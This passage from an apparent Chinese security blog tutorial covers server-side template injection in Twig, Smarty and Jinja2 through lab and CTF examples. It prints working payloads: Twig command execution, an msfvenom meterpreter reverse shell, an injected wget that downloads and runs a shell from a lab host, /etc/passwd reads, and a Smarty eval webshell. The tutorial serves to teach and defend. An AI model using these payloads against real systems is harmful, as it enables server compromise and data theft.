bmjoker16OK </p><p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207172609049.png" alt="image-20220207172609049"></p><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p><p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p><p>接下来借助XVWA的代码来实践演示一下SSTI注入</p><p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;&#x2F;div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>xvwa源代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;thumbnail&quot;&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">        &lt;img class&#x3D;&quot;img-responsive&quot; src&#x3D;&quot;http:&#x2F;&#x2F;placehold.it&#x2F;800x300&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;caption-full&quot;&gt;</span><br><span class="line">        &lt;h4&gt;&lt;a href&#x3D;&quot;#&quot;&gt;Server Side Template Injection (SSTI)&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p align&#x3D;&quot;justify&quot;&gt;</span><br><span class="line">Web application uses templates to make the web pages look more dynamic. Template Injection occurs when user input is embedded in a template in an unsafe manner. However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.          &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;p&gt;Read more about Server Side Template Injection (SSTI)&lt;br&gt;</span><br><span class="line">        &lt;strong&gt;&lt;a target&#x3D;&quot;_blank&quot; href&#x3D;&quot;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html&quot;&gt;http:&#x2F;&#x2F;blog.portswigger.net&#x2F;2015&#x2F;08&#x2F;server-side-template-injection.html &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&lt;&#x2F;strong&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;well&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;col-lg-6&quot;&gt; </span><br><span class="line">        &lt;p&gt;</span><br><span class="line">        Hint: &lt;br&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;Template Engine used is TWIG &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;Loader function used &#x3D; &quot;Twig_Loader_String &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;&lt;br&gt;</span><br><span class="line">        &lt;p&gt;Please Enter your Name.  </span><br><span class="line">            &lt;form method&#x3D;&#39;get&#39; action&#x3D;&#39;&#39;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;form-group&quot;&gt; </span><br><span class="line">                    &lt;label&gt;&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;input class&#x3D;&quot;form-control&quot; width&#x3D;&quot;50%&quot; placeholder&#x3D;&quot;Your Name&quot; name&#x3D;&quot;name&quot;&gt;&lt;&#x2F;input&gt; &lt;br&gt;</span><br><span class="line">                    &lt;div align&#x3D;&quot;right&quot;&gt; &lt;button class&#x3D;&quot;btn btn-default&quot; type&#x3D;&quot;submit&quot; name&#x3D;&#39;submit&#39;&gt;Submit Button&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;</span><br><span class="line">               &lt;&#x2F;div&gt; </span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                if (isset($_GET[&#39;submit&#39;])) &#123;</span><br><span class="line">                    $name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line">                    &#x2F;&#x2F; include and register Twig auto-loader</span><br><span class="line">                    include &#39;vendor&#x2F;twig&#x2F;twig&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;</span><br><span class="line">                    Twig_Autoloader::register();</span><br><span class="line">                    try &#123;</span><br><span class="line">                          &#x2F;&#x2F; specify where to look for templates</span><br><span class="line">                              $loader &#x3D; new Twig_Loader_String();</span><br><span class="line">  </span><br><span class="line">                          &#x2F;&#x2F; initialize Twig environment</span><br><span class="line">                              $twig &#x3D; new Twig_Environment($loader);</span><br><span class="line">                         &#x2F;&#x2F; set template variables</span><br><span class="line">                         &#x2F;&#x2F; render template</span><br><span class="line">                            $result&#x3D; $twig-&gt;render($name);</span><br><span class="line">                            echo &quot;Hello $result&quot;;</span><br><span class="line">  </span><br><span class="line">                    &#125; catch (Exception $e) &#123;</span><br><span class="line">                          die (&#39;ERROR: &#39; . $e-&gt;getMessage());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php include_once(&#39;..&#x2F;..&#x2F;about.html&#39;); ?&gt;</span><br></pre></td></tr></table></figure><p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173353137.png" alt="image-20220207173353137"></p><p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于&#123;&#123;&#125;&#125; 的处理方式</p><p>在这里提供一个针对twig的攻击载荷：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207173717250.png" alt="image-20220207173717250"></p><p>使用msf生成了一个php meterpreter有效载荷</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp -f raw LHOST&#x3D;172.20.10.2 LPORT&#x3D;4321 &gt; &#x2F;var&#x2F;tmp&#x2F;shell.txt</span><br></pre></td></tr></table></figure><p>msf进行监听：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207180708620.png" alt="image-20220207180708620"></p><p>模板注入远程下载shell，并重命名运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http:&#x2F;&#x2F;172.20.10.2&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php;php -f &#x2F;tmp&#x2F;shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220207181526053.png" alt="image-20220207181526053"></p><p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#x2F;etc&#x2F;passwd&#39;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#39;&#x2F;etc&#x2F;passwd&#39;,&#39;&#39;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#39;cat &#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体payload分析详见：《<a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p><p>　　　　　　　　　　 《<a href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p><p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p><p>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * gets  a stream variable</span><br><span class="line"> *</span><br><span class="line"> * @param  string $variable the stream of the variable</span><br><span class="line"> *</span><br><span class="line"> * @throws SmartyException</span><br><span class="line"> * @return mixed  the value of the stream variable</span><br><span class="line"> *&#x2F;</span><br><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">    $_result &#x3D; &#39;&#39;;</span><br><span class="line">    $fp &#x3D; fopen($variable, &#39;r+&#39;);</span><br><span class="line">    if ($fp) &#123;</span><br><span class="line">        while (!feof($fp) &amp;&amp; ($current_line &#x3D; fgets($fp)) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            $_result .&#x3D; $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        return $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty &#x3D; isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">    if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        throw new SmartyException(&#39;Undefined stream variable &quot;&#39; . $variable . &#39;&quot;&#39;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以用这个方法来读取文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>同样在</p><p>smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting &#x3D; error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            $old_umask &#x3D; umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath &#x3D; dirname($_filepath);</span><br><span class="line">        &#x2F;&#x2F; if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !&#x3D;&#x3D; &#39;.&#39; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms &#x3D;&#x3D;&#x3D; null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file &#x3D; $_dirpath . DS . str_replace(array(&#39;.&#39;, &#39;,&#39;), &#39;_&#39;, uniqid(&#39;wrt&#39;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;*</span><br><span class="line">         * Windows&#39; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#39; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#39; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            &#x2F;&#x2F; remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; rename tmp file</span><br><span class="line">            $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                &#x2F;&#x2F; remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; rename tmp file</span><br><span class="line">                $success &#x3D; @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !&#x3D;&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F; set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以构造payload写个webshell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><h3 id="CTF实例讲解"><a href="#CTF实例讲解" class="headerlink" title="CTF实例讲解"></a>CTF实例讲解</h3><p>CTF地址：<a href="https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p><p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093133128.png" alt="image-20220208093133128"></p><p>在页面的右上角发现了IP，题目中提供的API均无法访问，猜测这个IP受到X-Forwarded-For头控制。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208093254678.png" alt="image-20220208093254678"></p><p>修改XXF头发现值发生变化</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094103720.png" alt="image-20220208094103720"></p><p>直接构造{system(‘cat /flag’)}即可得到flag</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094226601.png" alt="image-20220208094226601"></p><p>本题中引发SSTI的代码简化后如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#39;.&#x2F;smarty&#x2F;libs&#x2F;&#39; . &#39;Smarty.class.php&#39;);</span><br><span class="line">    $smarty &#x3D; new Smarty();</span><br><span class="line">    $ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     &#x2F;&#x2F; display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p><h3 id="Smarty-SSTI常规利用方式"><a href="#Smarty-SSTI常规利用方式" class="headerlink" title="Smarty-SSTI常规利用方式"></a>Smarty-SSTI常规利用方式</h3><h4 id="smarty-version"><a href="#smarty-version" class="headerlink" title="{$smarty.version}"></a>{$smarty.version}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;    #获取smarty的版本号</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208094843016.png" alt="image-20220208094843016"></p><h4 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure><p>Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095011038.png" alt="image-20220208095011038"></p><p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p><h4 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095233169.png" alt="image-20220208095233169"></p><h4 id="getstreamvariable"><a href="#getstreamvariable" class="headerlink" title="getstreamvariable"></a>getstreamvariable</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095627806.png" alt="image-20220208095627806"></p><p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p><p>5.{if}{/if}</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}</em></p><p>既然这样就将XFF头改为 {if phpinfo()}{/if} ：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095833547.png" alt="image-20220208095833547"></p><p>同样还能用来执行一些系统命令：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208095933513.png" alt="image-20220208095933513"></p><h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p><p>关于blade模板这里不再多说，请参考《<a href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎</a>》</p><h1 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h1><p>python中常见的模版有: Jinja2, tornado</p><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p><p>Jinja2 模板同样支持控制语句，像在 &#123;%…%&#125; 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% for comment in comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure><p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们使用vulhub提供的环境进行复现，搭建成功后访问首页如图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181230660.png" alt="image-20220208181230660"></p><p>进入Docker容器来看一下对应的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>t = Template(“hello” + name)这行代码表示，将前段输入的name拼接到模版，此时name的输入没有进过任何检测，尝试使用模版语言测试：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208181449567.png" alt="image-20220208181449567"></p><p>如果使用了一个固定好了的模版，在模版渲染之后传入数据，就不存在模板注入，就好像SQL注入的预编译一样，修复上面代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name &#x3D; request.args.get(&#39;name&#39;, &#39;guest&#39;)</span><br><span class="line"></span><br><span class="line">    t &#x3D; Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span><br><span class="line">    return t.render(n&#x3D;name)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>编译运行，再次注入就会失败</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220208183412224.png" alt="image-20220208183412224"></p><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="用file对象来读取文件"><a href="#用file对象来读取文件" class="headerlink" title="用file对象来读取文件"></a>用file对象来读取文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    if(c.__name__&#x3D;&#x3D;&#39;file&#39;):</span><br><span class="line">        print(c)</span><br><span class="line">        print c(&#39;ol4three.txt&#39;).readlines()</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ssti.py</span><br><span class="line">&lt;type &#39;file&#39;&gt;</span><br><span class="line">[&#39;hello ol4three ~&#39;]</span><br></pre></td></tr></table></figure><p>上述代码先通过<strong>class</strong>获取字典对象所属的类，再通过<strong>base</strong>（<strong>bases[0]</strong>）拿到基类，然后使用<strong>subclasses</strong>()获取子类列表，在子类列表中直接寻找可以利用的类</p><p>为了方便理解，我直接把获取到的子类列表打印出来：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for c in &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">        print(c) </span><br></pre></td></tr></table></figure><p>打印结果如下（python2.7.18）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&lt;type &#39;weakref&#39;&gt;</span><br><span class="line">&lt;type &#39;weakcallableproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;weakproxy&#39;&gt;</span><br><span class="line">&lt;type &#39;int&#39;&gt;</span><br><span class="line">&lt;type &#39;basestring&#39;&gt;</span><br><span class="line">&lt;type &#39;bytearray&#39;&gt;</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&lt;type &#39;NoneType&#39;&gt;</span><br><span class="line">&lt;type 